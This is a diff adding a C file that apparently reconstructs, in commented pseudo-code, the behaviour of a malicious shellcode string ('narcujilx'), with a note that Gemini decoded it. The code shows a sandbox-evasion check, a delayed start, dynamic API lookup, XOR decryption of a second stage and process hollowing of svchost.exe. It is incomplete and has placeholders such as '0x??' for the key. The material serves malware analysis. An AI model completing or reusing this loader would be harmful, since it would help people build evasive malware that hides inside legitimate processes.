@@ -1,0 +1,42 @@
+#include <windows.h>
+#include <winternl.h>
+
+//  Decoded by Gemini
+// This mimics the 'narcujilx' byte string behavior
+void execute_hidden_payload() {
+    // 1. Anti-Sandbox Check (Opcodes check for CPU count)
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    if (si.dwNumberOfProcessors < 2) return;
+
+    // 2. Delay Execution (Opcode sleep)
+    Sleep(5000);
+
+    // 3. Resolve Windows APIs dynamically
+    // The shellcode 'walks' the Process Environment Block (PEB) 
+    // to find kernel32.dll without using standard imports.
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    
+    // It uses hashes (ROR13) to find these specific functions:
+    typedef LPVOID (WINAPI *PVA)(LPVOID, SIZE_T, DWORD, DWORD);
+    PVA pVirtualAlloc = (PVA)GetProcAddress(hKernel32, "VirtualAlloc");
+
+    // 4. Decryption Routine
+    // The latter half of 'narcujilx' is XOR-encrypted.
+    unsigned char* encrypted_stage = /* data after the NOP sled */;
+    for (int i = 0; i < payload_size; i++) {
+        encrypted_stage[i] ^= 0x??; // The XOR key found in the opcodes
+    }
+
+    // 5. Final Execution
+    // The code then performs "Process Hollowing"
+    // It starts a clean process (like svchost.exe) in a suspended state
+    // and replaces its memory with the decrypted payload.
+    STARTUPINFOA target_si = { sizeof(target_si) };
+    PROCESS_INFORMATION target_pi;
+    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, 
+                   CREATE_SUSPENDED, NULL, NULL, &target_si, &target_pi);
+
+    // [Opcodes for WriteProcessMemory and ResumeThread follow...]
+    ResumeThread(target_pi.hThread);
+}
